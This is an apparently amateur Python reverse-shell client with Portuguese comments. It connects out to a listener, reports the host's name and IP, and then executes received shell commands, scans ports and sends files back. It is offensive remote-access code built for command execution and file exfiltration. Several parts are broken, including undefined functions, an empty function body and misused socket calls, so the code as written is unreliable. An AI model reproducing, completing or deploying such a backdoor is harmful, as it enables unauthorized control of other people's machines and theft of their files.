#! usr/bin/env python

#Libs
import socket
import base64
import subprocess
from datetime import datetime
import os, sys
import time

#Conexao
hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Conectando
s.connect(("127.0.0.1", 1234))
s.send("Conexao Feita com:{} IP:{}".format(hostname, ip))

#Fucoes 
def scan():
	

#Main
def main():
	while True:
		data = decode(s.recv(1024))
		if data[:-1] == '/exit':
			sys.close()
			s.close()
			close()
		elif 'cd' in data:
			os.chdir(data[3:].strip('\n'))
		elif 'pwd' in data:
			s.send(os.cwd())

		elif 'scan' in data:
			target = decode(s.recv(1024))
			result = open('abertas.txt', 'w')
			portas = range(1,10000)
			for port in portas:
				codigo = s.connect_ex((target, port))
				s.settimeout(0.2)
			if '0' == codigo:
				result.write('[+] Port:{} Open\n'.format(port))
				s.close()
				r = open('abertas.txt', 'r')
				for i in r.readlines():
					s.send(i)
		
		elif 'download' in data:
			while True:
				data = decode(s.recv(1024))
				if '.txt' in data:
					file = open('{}'.format(data), 'r')
					for i in file.readlines():
						s.send(i)
				else:		
					file = open('{}'.format(data), 'rb') #Vai Ler o Arquivo
					for i in file.readlines(): #Para cada Linha do arquivo faca:
						s.send(i) #Enviando o Arquivo
		
		
		proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		s.send(output)

#Client
def client():
	main()
client()